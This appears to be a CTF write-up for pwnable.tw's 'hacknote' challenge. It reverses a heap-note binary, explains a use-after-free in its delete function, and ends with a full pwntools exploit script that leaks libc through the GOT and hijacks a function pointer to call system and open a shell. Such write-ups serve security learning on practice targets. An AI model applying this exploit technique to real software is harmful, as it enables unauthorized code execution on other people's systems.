---
layout: post
title: Hacknote writeup [pwnable.tw]
subtitle: Series of Pwnable.tw Writeups
tag: [pwn, pwnable.tw, writeup]
---

> A good Hacker should always take good notes!
>
> `nc chall.pwnable.tw 10102`
>
> [hacknote](https://github.com/th3-5had0w/CTF-contests/raw/master/pwnable.tw/hacknote/hacknote)
>
> [libc.so](https://github.com/th3-5had0w/CTF-contests/raw/master/pwnable.tw/hacknote/libc_32.so.6)

- Content:
    - [Reversing]()
    - [Vulnerability]()
    - [Exploit]()

# Reversing

Take a look and we realize this is a heapnote challenge, the binary allows us to create, delete, and print note.

```C
void __cdecl __noreturn main()
{
  int v0; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v0 = atoi(buf);
      if ( v0 != 2 )
        break;
      delete();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        print();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add();
    }
  }
}
```

We go deeper into these functions to see how they work:

* add:

```C
unsigned int add()
{
  _DWORD *v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( cnt <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !ptr_list[i] )
      {
        ptr_list[i] = malloc(8u); // note struct ptr
        if ( !ptr_list[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)ptr_list[i] = print_function_pointer; // print note content 
                                                            function ptr
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = ptr_list[i];
        v0[1] = malloc(size);
        if ( !*((_DWORD *)ptr_list[i] + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)ptr_list[i] + 1), size);
        puts("Success !");
        ++cnt;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

The binary allows us to create up to 5 note with arbitrary size, stored them in a ptr_list array. But it do not store directly the note pointers to that ptr_list array, instead it store the note struct pointer.

A note struct looks like this:

```C
struct {
    unsigned int *print_content_function = 0x0804862b;
    char *note_content;
};
```

* delete:

```C
unsigned int delete()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= cnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr_list[v1] )
  {
    free(*((void **)ptr_list[v1] + 1));
    free(ptr_list[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

This function use to delete the note content and note struct.

* print:

```C
unsigned int print()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= cnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( ptr_list[v1] )
    (*(void (__cdecl **)(void *))ptr_list[v1])(ptr_list[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```

Basically print out the content in the note that we create through the `print_content_function` in the note struct.

# Vulnerability

We could see the obvious Use After Free vulnerability at the delete function, the binary does not null out the freed pointer, but how do we turn this vulnerability into some thing useful?

Well, this is a little bit tricky but still. Let's think about it.

1. We create 2 notes with size 0x20, 4 chunks will be allocated, two 0x10 chunks for two note structs and two 0x20 chunks to containing note contents. We then named them note0 and note1

2. Delete the 2 notes we've just created.

3. Create a new note which we call note2 with size 0x10, now the will be two 0x10 chunks allocated, one for note struct and one for note content.

Hmmm, can you see something weird? 🧠

Yes, note2's note content is note1's note struct, therefore we can control "what" will note1 do to "where".

Well, that pretty much ended everything, we have both write-what-where, read-what-where primitives.

# Exploit

```python
from pwn import *


io = remote('chall.pwnable.tw', 10102)
libc = ELF('./libc_32.so.6')

#io = process('./hacknote')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./hacknote')

def add(size, content):
	print(io.recvuntil(':'))
	io.sendline('1')
	print(io.recvuntil('Note size :'))
	io.sendline(str(size))
	print(io.recvuntil('Content :'))
	io.send(content)

def delete(index):
	print(io.recvuntil(':'))
	io.sendline('2')
	print(io.recvuntil('Index :'))
	io.sendline(str(index))

def printf(index):
	print(io.recvuntil(':'))
	io.sendline('3')
	print(io.recvuntil('Index :'))
	io.sendline(str(index))

add(20, b'\n')
add(20, b'\n')
delete(0)
delete(1)
add(8, p32(0x804862b)+p32(elf.got['puts']))
printf(0)
libc.address = u32(io.recv(4))-libc.sym['puts']
delete(1)
add(8, p32(libc.sym['system'])+b'||sh')
printf(0)
io.interactive()
```